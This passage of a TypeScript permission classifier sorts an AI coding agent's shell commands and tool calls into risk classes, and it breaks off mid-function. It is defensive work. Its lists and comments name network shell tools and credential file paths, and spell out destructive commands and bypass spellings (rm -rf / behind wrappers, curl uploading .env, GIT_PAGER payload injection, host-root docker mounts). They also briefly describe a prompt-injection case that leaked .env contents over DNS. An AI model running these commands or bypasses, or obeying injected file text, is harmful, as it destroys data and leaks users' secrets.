/**
 * Tool-to-class classification: the pure function that decides which of the
 * five rule classes a resolved agent action lands in.
 *
 * One home on purpose. The destructive patterns here are the ones
 * `detectDangerousDeletion` carried inside the Claude router, moved out so the
 * rule exists once and the native runtime, the Grok argv builder and any future
 * provider all read the same table. Design:
 * `.dump/app/plans/2026-09-13-permission-floor.md`.
 */
import type { PermissionRuleClass } from "./policy"

/** A named pattern, so a denial can quote what matched. */
interface CommandPattern {
  /** Stable id, used in the rule name: `<class>.<id>`. */
  id: string
  test: (command: string, segments: CommandSegment[]) => boolean
  reason: string
}

interface CommandSegment {
  /** First command word of the segment, basename only, lowercased. */
  verb: string
  /** Every word of the segment, lowercased. */
  words: string[]
}

/**
 * Tools that only ever read, so they carry the read-only class.
 *
 * `SlashCommand` is deliberately absent. A custom slash command can carry a `!`
 * shell execution that does not come back through the Bash tool, so treating it
 * as read-only would let plan mode run a command, and a repository can ship its
 * own commands. It takes the residual `approval` class instead, which plan mode
 * refuses. `Skill` stays here because a skill's actions arrive as their own
 * gated tool calls.
 */
const READ_ONLY_TOOLS = new Set([
  "Read",
  "Glob",
  "Grep",
  "LS",
  "NotebookRead",
  "TodoWrite",
  "BashOutput",
  "AskUserQuestion",
  "Skill",
])

/** Tools that reach a network by design, whatever their arguments say. */
const NETWORK_TOOLS = new Set(["WebFetch", "WebSearch"])

/** Tools that write a file, so they carry the approval class. */
const FILE_EDIT_TOOLS = new Set(["Edit", "Write", "MultiEdit", "NotebookEdit"])

/** Tool input keys that name a filesystem path. */
const PATH_INPUT_KEYS = ["file_path", "path", "notebook_path"] as const

/** Every filesystem path this tool input names, in the order the keys appear. */
export function toolPathCandidates(toolInput: Record<string, unknown>): string[] {
  const found: string[] = []
  for (const key of PATH_INPUT_KEYS) {
    const value = toolInput[key]
    if (typeof value === "string" && value.length > 0) found.push(value)
  }
  return found
}

/**
 * Verbs that open an egress channel.
 *
 * The cloud and cluster CLIs are here wholesale because every subcommand they
 * have talks to an API, and DNS tools are here because DNS is a documented
 * exfiltration route that gets past egress filtering: CVE-2025-55284 hid a
 * prompt in a file Claude Code analysed and left with the `.env` contents in
 * DNS queries rather than an HTTP request.
 */
const NETWORK_VERBS = new Set([
  "curl",
  "wget",
  "nc",
  "ncat",
  "netcat",
  "telnet",
  "ssh",
  "scp",
  "sftp",
  "ftp",
  "lftp",
  "socat",
  "rclone",
  "mosh",
  "aws",
  "gcloud",
  "az",
  "kubectl",
  "dig",
  "nslookup",
  "host",
  "ping",
  "ping6",
  "traceroute",
  "tracepath",
  "mtr",
])

/**
 * Verbs that only open a channel for some subcommands, so the subcommand is
 * read before the segment counts as network. `docker ps` and `gh --version` are
 * local; `docker push` and `gh release upload` are not.
 */
const NETWORK_SUBCOMMAND_VERBS: Record<string, Set<string>> = {
  docker: new Set(["push", "pull", "login"]),
  podman: new Set(["push", "pull", "login"]),
  gh: new Set(["api", "release", "gist"]),
  openssl: new Set(["s_client", "s_server"]),
}

/** Git subcommands that talk to a remote. */
const NETWORK_GIT_SUBCOMMANDS = new Set(["push", "fetch", "clone", "pull", "remote", "ls-remote"])

/** Package-manager subcommands that publish rather than install. */
const NETWORK_PUBLISH_SUBCOMMANDS: Record<string, Set<string>> = {
  npm: new Set(["publish"]),
  yarn: new Set(["publish"]),
  pnpm: new Set(["publish"]),
  cargo: new Set(["publish"]),
  twine: new Set(["upload"]),
}

/**
 * Paths whose contents leave the machine the moment a model reads them, because
 * the model's context is uploaded to the provider by design. No later gate can
 * catch that, so the read itself is the exfiltration boundary.
 *
 * Deliberately narrow. `credentials` and `*.key` as bare substrings would match
 * ordinary source files, so each entry names a real secret location.
 */
const SECRET_PATH_PATTERNS: Array<{ id: string; test: (path: string) => boolean }> = [
  { id: "ssh-directory", test: (p) => p.includes(".ssh/") },
  {
    id: "aws-credentials",
    test: (p) => p.includes(".aws/credentials") || p.includes(".aws/config"),
  },
  { id: "github-cli-hosts", test: (p) => p.includes(".config/gh/hosts.yml") },
  { id: "netrc", test: (p) => /(^|\/)[._]netrc$/.test(p) },
  { id: "git-credentials", test: (p) => p.includes(".git-credentials") },
  { id: "provider-credentials", test: (p) => p.includes(".credentials.json") },
  { id: "private-key", test: (p) => /(^|\/)id_(rsa|dsa|ecdsa|ed25519)$/.test(p) },
  { id: "certificate", test: (p) => /\.(pem|p12|pfx|key)$/.test(p) },
  { id: "dotenv", test: (p) => isDotenvPath(p) },
]

/** Suffixes that mark a dotenv file as a template rather than a live secret. */
const DOTENV_SAFE_SUFFIXES = new Set(["example", "sample", "template", "dist", "md", "txt"])

function isDotenvPath(candidate: string): boolean {
  const segments = candidate.split(/[\\/]/)
  const name = segments.at(-1) ?? ""
  if (name === ".env") return true
  if (!name.startsWith(".env.")) return false
  return !DOTENV_SAFE_SUFFIXES.has(name.slice(".env.".length).toLowerCase())
}

/** The secret location this tool input names, when it names one. */
export function findSecretPath(
  toolInput: Record<string, unknown>,
): { id: string; path: string } | null {
  for (const candidate of toolPathCandidates(toolInput)) {
    for (const pattern of SECRET_PATH_PATTERNS) {
      if (pattern.test(candidate)) return { id: pattern.id, path: candidate }
    }
  }
  return null
}

/**
 * True when some segment names a secret location without writing to it.
 *
 * A segment that redirects is writing, and a write to `~/.ssh/authorized_keys`
 * is a protected-path overwrite rather than a leak, so it stays with the
 * destructive pattern that already names it and keeps its own accurate reason.
 * Everything else that names a secret is treated as a read, because the gate
 * cannot tell `cat` from `chmod` reliably and the cost of guessing wrong in the
 * other direction is a private key in a provider's context.
 */
function commandReadsSecret(segments: CommandSegment[]): boolean {
  return segments.some((segment) =>
    segment.words.some((word, index) => namesSecret(word) && !isWriteTarget(segment, index)),
  )
}

/**
 * True when the word at this index is being written to rather than read.
 *
 * Only the redirect target counts. An earlier version of this check asked
 * whether the segment contained a redirect anywhere, which made
 * `cat ~/.ssh/id_ed25519 2>/dev/null` look like a write and let the key through,
 * because a stderr redirect says nothing about where standard output goes. The
 * question that matters is whether this word sits on the receiving end of one.
 */
function isWriteTarget(segment: CommandSegment, index: number): boolean {
  if (segment.verb === "tee") return true
  const word = segment.words[index] ?? ""
  if (word.startsWith(">")) return true
  const previous = segment.words[index - 1] ?? ""
  return previous.endsWith(">")
}

/**
 * True when a word names a secret location, including through the punctuation
 * that attaches it to something else. `curl -F file=@.env` uploads a dotenv with
 * no space between the flag, the assignment and the path, and matching the whole
 * word only would have called that an ordinary network call.
 */
function namesSecret(word: string): boolean {
  const candidates = [word, word.replace(/^@/, "")]
  const separator = word.indexOf("=")
  if (separator >= 0) {
    const value = word.slice(separator + 1)
    candidates.push(value, value.replace(/^@/, ""))
  }
  return candidates.some((candidate) =>
    SECRET_PATH_PATTERNS.some((pattern) => pattern.test(candidate)),
  )
}

/**
 * Verbs that run the command after them instead of doing work of their own.
 *
 * Stripped before the real verb is read, because a wrapper otherwise hides a
 * command from every pattern in this file. `timeout 30 rm -rf /` read as the
 * verb `timeout`, which is not a delete, so the command landed in `approval` and
 * Agent mode allowed it. Claude Code strips the same idea before matching a Bash
 * rule, which its documentation lists as timeout, time, nice, nohup, stdbuf and
 * bare xargs, "so they cannot be used to smuggle a command past a rule".
 *
 * The shell verbs are here too, with their `-c` payload. Quotes are stripped
 * from every word first, so `bash -c "rm -rf /"` reads as the words
 * `bash -c rm -rf /` and the verb resolves to `rm`.
 */
const WRAPPER_VERBS = new Set([
  "sudo",
  "doas",
  "su",
  "runuser",
  "pkexec",
  "env",
  "command",
  "builtin",
  "exec",
  "nohup",
  "nice",
  "ionice",
  "time",
  "timeout",
  "stdbuf",
  "xargs",
  "setsid",
  "chroot",
  "unshare",
  "nsenter",
  "systemd-run",
  "machinectl",
  "script",
  "watch",
  "parallel",
  "sh",
  "bash",
  "zsh",
  "dash",
  "ksh",
  "eval",
])

/**
 * Wrapper options that take a separate value, so the value is skipped with them.
 * Without this, `sudo -u root rm -rf /` resolved its verb to `-u` and then to
 * `root`, and `nice -n 5 rm -rf /` resolved to `5`.
 *
 * `-c` is deliberately absent. It takes a value for some wrappers but for the
 * shell verbs it introduces the payload this file needs to read, so skipping the
 * next word would skip the real verb.
 */
const WRAPPER_VALUE_FLAGS = new Set([
  "-u",
  "-n",
  "-g",
  "-t",
  "--user",
  "--group",
  "--priority",
  "--cores",
])

/**
 * Wrappers whose first argument is a subject rather than a command, so the
 * subject is skipped with the wrapper. `su root -c "rm -rf /"` read its verb as
 * `root` without this, which is not a delete and not a wrapper, so the command
 * landed in `approval`. `su -c "rm -rf /"` needs no skip, because its first
 * argument is already a flag.
 */
const WRAPPER_SUBJECT_VERBS = new Set(["su", "runuser"])

/** A bare duration, which is what `timeout` and `time` take as their argument. */
const DURATION_WORD = /^\d+(?:\.\d+)?[smhd]?$/

/**
 * Normalise one word so a hidden verb cannot ride through it.
 *
 * Quotes are dropped, which is what turns `of="/dev/sda"` into `of=/dev/sda` and
 * `c"h"m"o"d` into `chmod`. Backslashes become forward slashes for two reasons:
 * `\rm -rf /` is the classic spelling that steps around a shell alias and it
 * resolves to the verb `rm` once the basename is taken, and a Windows path gains
 * the separators the secret patterns match on, so `C:\Users\me\.ssh\id_rsa`
 * reaches the `.ssh/` rule instead of sliding past it.
 */
function unquote(word: string): string {
  return word.replace(/\\/g, "/").replace(/["'`]/g, "")
}

/**
 * The verb of one segment: the first word that is not an environment
 * assignment, not a wrapper, and not a flag or a wrapper's value.
 */
function readVerb(words: string[]): string {
  for (let index = 0; index < words.length; index += 1) {
    const word = words[index]
    if (word === undefined) break
    if (word.includes("=")) continue
    if (word.startsWith("-")) {
      if (WRAPPER_VALUE_FLAGS.has(word)) index += 1
      continue
    }
    const base = word.split("/").pop() ?? word
    if (DURATION_WORD.test(base)) continue
    if (WRAPPER_VERBS.has(base)) {
      const subject = words[index + 1]
      if (WRAPPER_SUBJECT_VERBS.has(base) && subject && !subject.startsWith("-")) index += 1
      continue
    }
    return base
  }
  return ""
}

/**
 * Split a shell command into segments on the operators that start a new
 * command. `$IFS` becomes a space first, because it is the shell's own field
 * separator and `rm$IFS-rf$IFS/` is a documented way to write `rm -rf /` without
 * a literal space for a matcher to split on.
 *
 * This is not a shell parser and does not claim to be one, and it is not a
 * security boundary on its own: an interpreter that takes inline code,
 * `python -c` or `node -e`, still hides whatever it runs, and so do glob and
 * parameter spellings such as `/usr/bin/n[c]` and `who$@ami`. That gap is
 * recorded in `.dump/app/decisions/2026-09-13-permission-floor.md` rather than
 * papered over here, because the research on agent shell filters is unanimous
 * that a pattern list cannot win against a shell grammar and only an OS sandbox
 * can.
 */
export function splitCommandSegments(command: string): CommandSegment[] {
  return (
    command
      .replace(/\$\{?ifs\}?/gi, " ")
      // `find . \( -name x \) -delete` groups its predicates with escaped
      // parentheses, which are arguments rather than a subshell. Splitting on them
      // put `-delete` in a segment of its own, away from the `find` that carries
      // it, and the delete read as an ordinary command.
      .replace(/\\\(|\\\)/g, " ")
      .split(/&&|\|\||[|;\n`()]|\$\(/)
      .map((raw) => raw.trim())
      .filter((text) => text.length > 0)
      .map((text) => {
        const words = text
          .split(/\s+/)
          .filter((word) => word.length > 0)
          .map((word) => unquote(word).toLowerCase())
          .filter((word) => word.length > 0)
        return { verb: readVerb(words), words }
      })
  )
}

function hasRecursiveForceRm(segments: CommandSegment[]): boolean {
  return segments.some((segment) => {
    if (segment.verb !== "rm") return false
    const shortFlags = segment.words
      .filter((word) => /^-[a-z]+$/.test(word))
      .map((word) => word.slice(1))
      .join("")
    const recursive = shortFlags.includes("r") || segment.words.includes("--recursive")
    const force = shortFlags.includes("f") || segment.words.includes("--force")
    return recursive && force
  })
}

/**
 * True when the command redirects into a protected location.
 *
 * `/dev/tcp` and `/dev/udp` are excluded because they are bash's pseudo-device
 * sockets rather than files, and `exec 196<>/dev/tcp/host/port` is a network
 * connection. Calling that a write into a protected directory would deny it for
 * the wrong reason, and the network rule names what it actually is.
 */
/** Verbs whose argument is always a destination, so any position counts. */
const WRITES_TO_ARGUMENT = new Set(["tee", "truncate"])

/** Verbs whose destination is their last argument, so only that one counts. */
const MOVES_INTO_ARGUMENT = new Set(["cp", "mv", "install"])

/**
 * Locations a write needs a card for. `/dev` is absent because the block-device
 * rule covers it precisely, and a prefix match there would call `dd of=/dev/null`
 * a disk reformat.
 */
const PROTECTED_WRITE_PREFIXES = ["/etc/", "~/.ssh/", "/usr/", "/bin/", "/sbin/", "/boot/"]

function hasProtectedRedirect(command: string): boolean {
  return />\s*(\/etc\/|~\/\.ssh\/|\/usr\/|\/bin\/|\/sbin\/|\/boot\/|\/dev\/(?!tcp|udp))/.test(
    command,
  )
}

/**
 * True when a write verb targets a protected location with no redirect operator
 * to match. `tee ~/.ssh/authorized_keys` installs a key and would otherwise land
 * in the approval class, which Agent mode allows.
 */
function writesProtectedPath(segments: CommandSegment[]): boolean {
  return segments.some((segment) => {
    if (WRITES_TO_ARGUMENT.has(segment.verb)) return segment.words.some(isProtectedLocation)
    // `cp /etc/passwd /tmp/copy` reads a protected file and writes an ordinary
    // one, so a copy verb only counts when the protected path is where the bytes
    // are going, which is its last argument.
    if (MOVES_INTO_ARGUMENT.has(segment.verb))
      return isProtectedLocation(segment.words.at(-1) ?? "")
    return false
  })
}

function isProtectedLocation(word: string): boolean {
  return PROTECTED_WRITE_PREFIXES.some((prefix) => word.startsWith(prefix))
}

function hasDestructiveSql(command: string): boolean {
  return /\b(DROP|TRUNCATE)\s+(TABLE|DATABASE|SCHEMA)\b/i.test(command)
}

/**
 * A `git push` that rewrites remote history. Read from the segment rather than
 * by regex over the whole command, because the regex needed `git` and `push` to
 * be adjacent and so missed `git -C /repo push --force`.
 */
function hasForcedGitPush(segments: CommandSegment[]): boolean {
  return segments.some((segment) => {
    if (segment.verb !== "git" || readSubcommand(segment) !== "push") return false
    return segment.words.some(isForceSpelling)
  })
}

/**
 * True for any way of spelling a forced push: the long flags, a short-flag
 * cluster containing `f` such as `-f` or `-fu`, and the `+refspec` form, which
 * forces the update without naming a flag at all.
 */
function isForceSpelling(word: string): boolean {
  if (word.startsWith("--force")) return true
  if (word.startsWith("+") && word.length > 1) return true
  return /^-[a-z]*f[a-z]*$/.test(word)
}

/**
 * A git command that throws work away. Read from the segment rather than by
 * regex over the whole command, for the reason `hasForcedGitPush` gives: git's
 * own global options sit between `git` and the subcommand, so
 * `git -C /repo reset --hard` and `git --no-pager clean -fdx` both defeat a
 * pattern that expects the two words to be adjacent. Fixing that for `push` and
 * leaving it here would have been half a fix.
 */
function hasDiscardingGitCommand(segments: CommandSegment[]): boolean {
  return segments.some((segment) => {
    if (segment.verb !== "git") return false
    const subcommand = readSubcommand(segment)
    if (subcommand === "reset") return segment.words.includes("--hard")
    if (subcommand === "clean") return segment.words.some(isForceSpelling)
    if (subcommand === "stash") {
      return segment.words.includes("clear") || segment.words.includes("drop")
    }
    if (subcommand === "reflog") return segment.words.includes("expire")
    if (subcommand === "update-ref" || subcommand === "tag") {
      return segment.words.some((word) => word === "-d" || word === "--delete")
    }
    // `filter-branch` and `filter-repo` rewrite every commit in the repository,
    // which is unrecoverable once the originals are garbage collected.
    return subcommand === "filter-branch" || subcommand === "filter-repo"
  })
}

/**
 * A forced branch delete. Checked against the raw command because the segment
 * words arrive lowercased, and lowercasing is what makes `git branch -D`, which
 * discards an unmerged branch, indistinguishable from `git branch -d`, which
 * refuses to. The character class stands in for the segment boundary so git's
 * global options between `git` and `branch` do not defeat the match, which is
 * the same adjacency problem the segment-based checks above exist to avoid.
 */
const FORCED_BRANCH_DELETE = /\bgit\b[^|;&\n]*\bbranch\b[^|;&\n]*(?:-[a-z]*D|--delete)/

function hasForcedBranchDelete(command: string): boolean {
  return FORCED_BRANCH_DELETE.test(command)
}

/** Partition and filesystem tools, which destroy data whatever their args. */
const DISK_VERBS = new Set([
  "wipefs",
  "fdisk",
  "cfdisk",
  "sfdisk",
  "parted",
  "sgdisk",
  "gdisk",
  "mkswap",
  "partprobe",
])

/**
 * Tools that destroy a device only for some subcommands, so the subcommand or
 * the flag is read before the segment counts. `nvme list` and `mdadm --detail`
 * are reads, while `nvme format` and `mdadm --zero-superblock` are not, and
 * treating the verb alone as destructive would ask for a card on every query.
 */
const DISK_SUBCOMMAND_VERBS: Record<string, Set<string>> = {
  nvme: new Set(["format", "sanitize"]),
  dmsetup: new Set(["remove", "remove_all", "wipe_table", "suspend"]),
  losetup: new Set(["-d", "--detach", "-D", "--detach-all"]),
}

/** Flags whose presence makes the verb destructive rather than a query. */
const DISK_DESTRUCTIVE_FLAGS: Record<string, RegExp> = {
  hdparm: /^--(security-erase|security-erase-null|make-bad|fwdownload)/,
  mdadm: /^--(zero-superblock|remove|stop|zero)/,
  badblocks: /^-[a-z]*w/,
  smartctl: /^--(security-erase|sanitize)/,
}

/** Verbs that write their input somewhere, so the target decides the danger. */
const WRITE_VERBS = new Set(["dd", "tee", "truncate", "cat", "cp", "shred"])

/**
 * A block device rather than any `/dev` entry. `/dev/null`, `/dev/zero`,
 * `/dev/stdout` and `/dev/shm` are not storage and writing to them destroys
 * nothing, so matching `/dev/` as a prefix called `dd if=x of=/dev/null` a disk
 * reformat. The pseudo-device sockets `/dev/tcp` and `/dev/udp` are excluded for
 * the same reason, and they are a network rule instead.
 */
const BLOCK_DEVICE =
  /^\/dev\/(sd[a-z]|hd[a-z]|vd[a-z]|xvd[a-z]|nvme\d|md\d|loop\d|mmcblk\d|sr\d|zd\d|dasd|mapper\/|disk\/|block\/)/

/** Power-state verbs, whether invoked directly or through a service manager. */
const POWER_VERBS = new Set(["shutdown", "reboot", "halt", "poweroff"])

function hasDiskOrPowerVerb(segments: CommandSegment[]): boolean {
  return segments.some((segment) => {
    if (segment.verb.startsWith("mkfs")) return true
    if (DISK_VERBS.has(segment.verb)) return true
    if (writesBlockDevice(segment)) return true
    if (DISK_SUBCOMMAND_VERBS[segment.verb]?.has(readSubcommand(segment))) return true
    const flag = DISK_DESTRUCTIVE_FLAGS[segment.verb]
    if (flag && segment.words.some((word) => flag.test(word))) return true
    if (segment.verb === "chmod" && segment.words.includes("777")) {
      return segment.words.some((word) => word === "/" || word.startsWith("/*"))
    }
    // `systemctl poweroff` and `service host reboot` reach the same place the
    // bare verbs do, so the subcommand is read for them too.
    if (segment.verb === "systemctl" || segment.verb === "service") {
      return segment.words.some((word) => POWER_VERBS.has(word))
    }
    return POWER_VERBS.has(segment.verb)
  })
}

/**
 * True when the segment writes to a block device. `dd` names its output with
 * `of=`, which is why the check reads that word rather than the whole segment,
 * and every other write verb takes the device as a positional argument.
 */
function writesBlockDevice(segment: CommandSegment): boolean {
  if (!WRITE_VERBS.has(segment.verb)) return false
  if (segment.verb === "dd") {
    return segment.words.some((word) => word.startsWith("of=") && BLOCK_DEVICE.test(word.slice(3)))
  }
  return segment.words.some((word) => BLOCK_DEVICE.test(word))
}

/**
 * A `find` that removes what it matches, with no `rm` in the leading position
 * for a verb check to find. `-delete` is the obvious spelling and `-exec rm` is
 * the one that gets past a denylist keyed on `rm`, which is a reported bypass
 * against a shipped agent in the wild. CVE-2026-55743 is the same oversight one
 * layer down: the guard blocked `-exec` and `-ok` but not the functionally
 * identical `-execdir` and `-okdir`, so all four are covered here.
 *
 * An exec'd path is caught as well as an exec'd delete verb, because
 * `find . -execdir /tmp/run.sh {} ;` runs attacker-chosen code once per matched
 * file and names no delete verb at all.
 */
function findDeletes(segment: CommandSegment): boolean {
  if (segment.verb !== "find") return false
  if (segment.words.includes("-delete")) return true
  const flagIndex = segment.words.findIndex((word) => FIND_EXEC_FLAGS.has(word))
  if (flagIndex < 0) return false
  const executed = segment.words[flagIndex + 1]
  if (executed === undefined) return false
  if (DELETE_VERBS.has(executed.split("/").pop() ?? executed)) return true
  return executed.startsWith("/") || executed.startsWith("./") || SCRIPT_SUFFIX.test(executed)
}

/** The `find` predicates that run a command per matched file. */
const FIND_EXEC_FLAGS = new Set(["-exec", "-execdir", "-ok", "-okdir"])

/** Verbs that remove a file, whichever of them `find` is told to run. */
const DELETE_VERBS = new Set(["rm", "rmdir", "shred", "unlink"])

/** A suffix that makes a word an executable script rather than an argument. */
const SCRIPT_SUFFIX = /\.(sh|bash|zsh|py|pl|rb|js|mjs|cjs|exe)$/

/**
 * Environment assignments that make an allowlisted binary run code the caller
 * chose. `LD_PRELOAD=/tmp/x.so git status` reads as the verb `git`, which is
 * ordinary, and then loads the shared object into it. The assignment is the
 * payload and the binary is only the carrier, so the verb check cannot see it.
 *
 * CVE-2026-55743 is exactly this shape: a shipped desktop agent stripped leading
 * `KEY=value` assignments before validating the command, so
 * `GIT_PAGER=/tmp/payload.sh git log` ran the payload through an allowlisted
 * `git`. Benign assignments stay allowed, and the published benign examples are
 * `TZ=UTC git log` and `NODE_ENV=production npm test`, which is why the variable
 * name has to be one that carries code and the value has to look executable.
 * `GIT_PAGER=cat` and `EDITOR=vim` are neither.
 */
const CODE_EXECUTION_ENV_VARS = new Set([
  "ld_preload",
  "ld_audit",
  "ld_library_path",
  "bash_env",
  "bash_func",
  "env",
  "shell",
  "pythonstartup",
  "pythonpath",
  "perl5opt",
  "rubyopt",
  "node_options",
  "git_pager",
  "git_editor",
  "git_sequence_editor",
  "git_external_diff",
  "git_ssh_command",
  "git_proxy_command",
  "git_hook_path",
  "git_config",
  "git_config_global",
  "git_config_system",
  "core.pager",
  "core.editor",
  "core.sshcommand",
  "core.hookspath",
  "core.fsmonitor",
  "core.askpass",
  "git_askpass",
  "git_template_dir",
  "ssh_askpass",
  "pager",
  "editor",
  "visual",
  "sequence.editor",
  "diff.external",
  "prompt_command",
  "lessopen",
  "lessclose",
  "java_tool_options",
  "jdk_java_options",
  "git_config_count",
])

/**
 * The numbered form of git's config injection, which needs no shell quoting and
 * no config file: `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager
 * GIT_CONFIG_VALUE_0=/tmp/x.sh git log`. The suffix is an index, so the names
 * cannot be listed and are matched instead.
 */
const NUMBERED_GIT_CONFIG = /^git_config_(key|value)_\d+$/

function hasCodeExecutionEnvAssignment(command: string, segments: CommandSegment[]): boolean {
  // An assignment cannot exist without one, and this runs on every shell command
  // the gate sees, so the cheap test comes before either scan.
  if (!command.includes("=")) return false
  if (segments.some((segment) => segment.words.some(isCodeExecutionAssignment))) return true
  // A second scan over the raw command, because the segment splitter breaks on a
  // pipe and a value can contain one. `LESSOPEN='|/tmp/x.sh %s' less file` is a
  // real spelling and its assignment lands in a segment of its own, halved.
  const lower = command.toLowerCase()
  for (const match of lower.matchAll(/([a-z_][\w.]*)=([^\s;]*)/g)) {
    const [, name, value] = match
    if (name === undefined || value === undefined) continue
    if (!CODE_EXECUTION_ENV_VARS.has(name) && !NUMBERED_GIT_CONFIG.test(name)) continue
    if (looksExecutable(value.replace(/["'`]/g, ""))) return true
  }
  return false
}

function isCodeExecutionAssignment(word: string): boolean {
  const separator = word.indexOf("=")
  if (separator <= 0) return false
  const name = word.slice(0, separator)
  if (!CODE_EXECUTION_ENV_VARS.has(name) && !NUMBERED_GIT_CONFIG.test(name)) return false
  return looksExecutable(word.slice(separator + 1))
}

/** True when an assigned value names a file that could be run or loaded. */
function looksExecutable(value: string): boolean {
  if (value.length === 0) return false
  if (value.startsWith("/") || value.startsWith("./") || value.startsWith("~/")) return true
  if (value.includes("/")) return true
  return SCRIPT_SUFFIX.test(value) || value.endsWith(".so") || value.endsWith(".dll")
}

/** A `shred` of anything. It overwrites a file so it cannot be recovered. */
function hasShred(segments: CommandSegment[]): boolean {
  return segments.some((segment) => segment.verb === "shred")
}

/** Container verbs that start a process, so a volume mount becomes a host write. */
const CONTAINER_RUN_SUBCOMMANDS: Record<string, Set<string>> = {
  docker: new Set(["run", "create", "exec"]),
  podman: new Set(["run", "create", "exec"]),
}

/** Host paths whose mount into a container defeats the worktree containment. */
const HOST_MOUNT_PATHS = ["/", "~", "/etc", "/home", "/root", "/var", "/usr", "/bin", "/dev"]

/**
 * True when a container is started with the host's own filesystem mounted in.
 * `docker run -v /:/host alpine rm -rf /host` runs an unrestricted delete on the
 * host through a path the gate never sees, and a container is a network rule for
 * its pull, which turbo allows, so the mount itself has to be the thing caught.
 */
function hasHostRootMount(segments: CommandSegment[]): boolean {
  return segments.some((segment) => {
    if (!CONTAINER_RUN_SUBCOMMANDS[segment.verb]?.has(readSubcommand(segment))) return false
    return segment.words.some(isHostMountSpec)
  })
}

function isHostMountSpec(word: string): boolean {
  const host = mountHostOf(word)
  if (host === null || host.length === 0) return false
  return HOST_MOUNT_PATHS.some((path) => host === path || host.startsWith(`${path}/`))
}

/**
 * The host side of a bind mount in one word, or null when the word is not a
 * mount specification. All three spellings count: `-v /:/host` puts the spec in
 * the word after the flag, `--volume=/:/host` glues it on, and
 * `--mount=type=bind,source=/,target=/host` names it as a key.
 */
function mountHostOf(word: string): string | null {
  if (word.startsWith("--mount=")) {
    const source = word
      .slice("--mount=".length)
      .split(",")
      .find((part) => part.startsWith("source="))
    return source === undefined ? null : source.slice("source=".length)
  }
  if (word.startsWith("--volume=")) return word.slice("--volume=".length).split(":")[0] ?? null
  const colon = word.indexOf(":")
  return colon >= 0 ? word.slice(0, colon) : null
}

function hasInitKill(segments: CommandSegment[]): boolean {
  return segments.some(
    (segment) =>
      (segment.verb === "kill" && segment.words.includes("1")) || segment.verb === "killall",
  )
}

/** Destructive patterns, checked in order. The first match names the rule. */
export const DESTRUCTIVE_PATTERNS: CommandPattern[] = [
  {
    id: "recursive-force-delete",
    test: (_command, segments) => hasRecursiveForceRm(segments),
    reason: "a recursive force delete removes files with no way to undo it",
  },
  {
    id: "bulk-find-delete",
    test: (_command, segments) => segments.some(findDeletes),
    reason: "a find that deletes or execs a delete removes every path it matches, with no undo",
  },
  {
    id: "env-injection",
    test: (command, segments) => hasCodeExecutionEnvAssignment(command, segments),
    reason:
      "an environment assignment makes the command that follows run code from a path this run chose",
  },
  {
    id: "shred",
    test: (_command, segments) => hasShred(segments),
    reason: "shred overwrites a file so its contents cannot be recovered",
  },
  {
    id: "destructive-sql",
    test: (command) => hasDestructiveSql(command),
    reason: "DROP or TRUNCATE destroys stored data",
  },
  {
    id: "forced-git-push",
    test: (_command, segments) => hasForcedGitPush(segments),
    reason: "a forced push rewrites history other people may have pulled",
  },
  {
    id: "discarding-git-command",
    test: (command, segments) =>
      hasDiscardingGitCommand(segments) || hasForcedBranchDelete(command),
    reason: "a hard reset, forced clean or history rewrite discards work",
  },
  {
    id: "protected-path-overwrite",
    test: (command, segments) => hasProtectedRedirect(command) || writesProtectedPath(segments),
    reason: "the command writes into a protected system directory",
  },
  {
    id: "disk-or-power",
    test: (_command, segments) => hasDiskOrPowerVerb(segments),
    reason: "the command reformats a device or changes machine power state",
  },
  {
    id: "host-root-mount",
    test: (_command, segments) => hasHostRootMount(segments),
    reason:
      "the command mounts the host filesystem into a container, which steps outside the worktree",
  },
  {
    id: "init-kill",
    test: (_command, segments) => hasInitKill(segments),
    reason: "the command kills the init process or every process with a name",
  },
]

/** A command the critical-path breaker caught, with the reason it shows. */
export interface CriticalPathBreach {
  /** Stable rule suffix. The evaluator emits `critical-path.<id>`. */
  id: string
  reason: string
}

/**
 * The critical-path breaker. Null means the command is ordinary.
 *
 * This runs above the allow-list and downgrades an allow to an ask, so no rule a
 * user writes can approve it. Claude Code holds the same line: an allow rule and
 * a hook that returns allow both fail to approve an `rm` or `rmdir` on a
 * critical path, and that stays true in its most permissive mode.
 *
 * `worktreeRoot` is optional because the classifier is pure and node-free. The
 * evaluator passes the run's worktree, which makes `rm -rf <worktree>` critical
 * too. Without it the lexical targets above still apply.
 */
export function criticalPathBreach(
  command: string,
  worktreeRoot?: string,
): CriticalPathBreach | null {
  const segments = splitCommandSegments(command)

  if (hasDiskOrPowerVerb(segments)) {
    return {
      id: "disk-or-power",
      reason: "the command reformats a device or changes machine power state",
    }
  }

  for (const segment of segments) {
    if (!segmentDeletes(segment)) continue
    // Every target, not just the first. `rm -rf /tmp/build /` names an ordinary
    // path before the filesystem root, and a scan that stopped at the first
    // candidate would let the root through.
    for (const target of deleteTargets(segment)) {
      const kind = criticalTargetKind(target, worktreeRoot)
      if (kind === null) continue
      return {
        id: "critical-delete",
        reason: `the command deletes ${kind}, and nothing recovers that`,
      }
    }
  }

  return null
}

/**
 * True when this segment deletes something the breaker should look at: `rm`,
 * `rmdir`, or a `find` carrying `-delete`.
 */
function segmentDeletes(segment: CommandSegment): boolean {
  if (segment.verb === "rm" || segment.verb === "rmdir") return true
  return findDeletes(segment)
}

/**
 * The candidate delete targets in one segment: every word that is not the verb,
 * not `sudo`, and not a flag. A delete can name several paths at once, so this
 * returns them all rather than the first one that happens to match.
 *
 * For a `find` the search root is the first non-flag word, and the remaining
 * words are predicates such as `-name` and their values, which are not paths.
 * They are harmless here because `criticalTargetKind` only answers for the exact
 * critical spellings and returns null for anything else.
 */
function deleteTargets(segment: CommandSegment): string[] {
  return segment.words.filter(
    (word) => word !== segment.verb && word !== "sudo" && !word.startsWith("-"),
  )
}

/**
 * Names a critical target in plain words rather than echoing the token, because
 * a reason is shown in the UI and this file's other reasons never quote command
 * text. Null means the target is ordinary and the mode's own verdict governs it.
 *
 * Words arrive lowercased from `splitCommandSegments`, so `$HOME` is compared as
 * `$home`. `.` and `..` count as critical because this repository has a real
 * incident on record where an empty path variable turned a cleanup call into a
 * delete of the parent directory. A longer target such as `./node_modules` is
 * ordinary.
 */
function criticalTargetKind(target: string, worktreeRoot?: string): string | null {
  if (target === "/" || target === "/*") return "the filesystem root"
  if (target === "~" || target === "~/" || target === "$home" || target === "$home/") {
    return "the home directory"
  }
  if (target === "." || target === "./") return "the whole working directory"
  if (target === ".." || target === "../") return "the parent of the working directory"
  if (worktreeRoot !== undefined) {
